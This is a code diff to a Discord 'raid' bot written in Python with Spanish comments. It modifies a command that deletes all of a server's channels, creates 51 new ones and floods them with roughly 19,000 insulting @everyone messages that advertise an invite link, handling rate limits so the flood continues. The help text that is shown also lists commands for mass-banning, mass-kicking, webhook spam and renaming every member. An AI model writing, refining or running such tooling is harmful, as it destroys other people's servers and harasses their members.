@@ -131,7 +131,7 @@ async def banpro(ctx):
         await asyncio.sleep(0.8)
 
 
-# ================= 2. COMANDO RAIDEAR Y SPAM (rD) SIN TEMPORIZADOR =================
+# ================= 2. COMANDO RAIDEAR Y SPAM (rD) MODIFICADO =================
 @bot.command()
 async def rD(ctx):
     global ejecuciones_por_servidor
@@ -142,7 +142,6 @@ async def rD(ctx):
 
     actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)
 
-    # Control de límite por concurrencia de ataques simultáneos
     if actuales >= MAX_EJECUCIONES:
         try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). Espera a que termine el ataque actual.")
         except: pass
@@ -153,21 +152,30 @@ async def rD(ctx):
     try:
         ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
         sumado = True
-        logging.info(f"📈 [INICIO ANIDADO] Contador para Guild {ctx.guild.id}: {actuales + 1}/{MAX_EJECUCIONES}")
 
-        channels_to_delete = list(ctx.guild.channels)
-        for channel in channels_to_delete:
+        # 1. Borrar canales previos
+        for channel in list(ctx.guild.channels):
             try: await channel.delete()
             except: pass
 
+        # 2. Crear canales (1 especial + 50 de spam)
         created_channels = []
+        
+        # Canal especial
+        try:
+            ch_especial = await ctx.guild.create_text_channel(name="Unete-a-Mc-r")
+            await ch_especial.send("https://discord.gg/aACMXB4HSp")
+        except: pass
+
+        # Canales de spam
         for _ in range(50):
             try:
                 ch = await ctx.guild.create_text_channel(name="Mc R")
                 created_channels.append(ch)
             except: pass
 
-        msg_por_canal = 400 
+        # 3. Spam de 18,999 mensajes en total (distribuidos en los 50 canales)
+        msg_por_canal = 380 
         mensaje_spam = "@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp"
         gif_file = await obtener_gif_file()
         
@@ -179,7 +187,7 @@ async def rD(ctx):
                         await channel.send(content=mensaje_spam, file=gif_file)
                     else:
                         await channel.send(content=mensaje_spam)
-                    await asyncio.sleep(0.1) 
+                    await asyncio.sleep(1.0) # Control de cadencia
                 except discord.HTTPException as e:
                     if e.status == 429: await asyncio.sleep(5)
                     else: break
@@ -191,7 +199,6 @@ async def rD(ctx):
         if sumado:
             actuales_al_final = ejecuciones_por_servidor.get(ctx.guild.id, 1)
             ejecuciones_por_servidor[ctx.guild.id] = max(0, actuales_al_final - 1)
-            logging.info(f"📉 [FIN ANIDADO] Contador para Guild {ctx.guild.id} restablecido a: {ejecuciones_por_servidor[ctx.guild.id]}/{MAX_EJECUCIONES}")
 
 
 # ================= 3. EXPULSIÓN MASIVA =================
@@ -421,7 +428,7 @@ async def ayuda(ctx):
         "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
         "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
         "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
-        "!rD           -> elimina todo, crear 50 canales e inundar con 20k mensajes.\n"
+        "!rD           -> elimina todo, crear 51 canales e inundar con 20k mensajes.\n"
         "!ccpro        -> elimina canales y crea 50 categorías para colapsar UI.\n"
         "!hookpro      -> Genera webhooks de spam ultra veloz por canal.\n"
         "!nickpro      -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
@@ -446,4 +453,4 @@ async def on_command_error(ctx, error):
     logging.error(f"Error: {error}")
 
 bot.run(TOKEN)
-                    
+        
